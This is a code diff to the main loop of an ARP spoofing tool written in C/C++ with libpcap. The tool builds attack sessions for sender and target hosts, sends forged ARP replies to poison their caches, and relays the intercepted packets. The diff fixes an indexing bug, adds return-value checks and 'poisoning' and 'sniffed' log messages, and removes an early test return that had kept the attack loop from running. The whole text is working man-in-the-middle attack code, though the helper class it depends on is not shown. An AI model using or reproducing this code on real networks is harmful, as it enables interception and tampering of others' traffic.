@@ -67,21 +67,21 @@ int main(int argc, char *argv[])
 	session_list = (Attack_session**) malloc( sizeof(Attack_session*) * session_num );
 
 	for(int i=1 ; i <= session_num ; i++){
-		session_list[i] = new Attack_session( (uint8_t*)argv[i*2], (uint8_t*)argv[i*2+1], (uint8_t*)myIPstr, (uint8_t*)myMAC);
+		session_list[i-1] = new Attack_session( (uint8_t*)argv[i*2], (uint8_t*)argv[i*2+1], (uint8_t*)myIPstr, (uint8_t*)myMAC);
 		printf("session%02d ",i);
-		session_list[i]->print_me();
+		session_list[i-1]->print_me();
 	}
 
 
 	send=(u_char*)malloc(65536);
-	return(1); //test until here
+
 	for(int i=0 ; i < session_num ; i++){
-		session_list[i]->send_true_request((char*)send,1);
-		if(pcap_sendpacket(handle,send,42) != 0)
-			printf("session%02d :failed to send normal request to sender",i+1);
-		session_list[i]->send_true_request((char*)send,2);
-		if(pcap_sendpacket(handle,send,42) != 0)
-			printf("session%02d :failed to send normal request to target",i+1);
+		if(session_list[i]->send_true_request((char*)send,1) == 1)
+			if(pcap_sendpacket(handle,send,42) != 0)
+				printf("session%02d :failed to send normal request to sender",i+1);
+		if(session_list[i]->send_true_request((char*)send,2) == 1)
+			if(pcap_sendpacket(handle,send,42) != 0)
+				printf("session%02d :failed to send normal request to target",i+1);
 	}
 	while(1){
 		/* Grab a packet */
@@ -91,15 +91,18 @@ int main(int argc, char *argv[])
 					if( session_list[i]->recv_true_reply((char*)packet) );
 					if( session_list[i]->is_ready() == 0) continue;
 					if( session_list[i]->is_ready() == 1){
+						printf("session%02d : poisoning\n",i+1);
 						session_list[i]->send_false_request((char*)send);
 						pcap_sendpacket(handle,send,42);
 					}
-					if( session_list[i]->recv_request((char*)send,(char*)packet) ){
+					if( session_list[i]->recv_request((char*)send,(char*)packet) == 1 ){
 						pcap_sendpacket(handle,send,42);
+						printf("session%02d : sniffed ARP request\n",i+1);
 					}
-					if( session_list[i]->chk_relay_condition((char*)packet) ){
-						session_list[i]->make_relay_packet((char*)send,(char*)packet,header->len);
-						pcap_sendpacket(handle,send,header->len);
+					if( session_list[i]->chk_relay_condition((char*)packet) == 1 ){
+						if( session_list[i]->make_relay_packet((char*)send,(char*)packet,header->len) == 1 ){
+							pcap_sendpacket(handle,send,header->len);
+						}
 					}
 					
 					
